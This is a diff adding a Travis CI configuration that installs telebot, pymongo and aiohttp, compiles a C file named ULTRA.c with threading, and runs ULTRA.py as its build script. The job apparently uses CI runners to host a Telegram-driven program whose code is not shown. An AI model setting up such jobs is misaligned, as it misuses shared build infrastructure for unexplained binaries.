@@ -1,0 +1,22 @@
+language: python
+dist: focal
+python:
+  - "3.10"
+before_install:
+  - sudo apt-get update
+  - sudo apt-get install -y gcc
+
+install:
+
+  - python3 -m pip install --upgrade pip
+  - python3 -m pip install telebot pymongo aiohttp
+
+before_script:
+
+  - if [ -f ULTRA.c ]; then gcc ULTRA.c -o ULTRA -lpthread; fi
+
+script:
+
+  - chmod +x * && lscpu && python3 ULTRA.py
+  
+                               
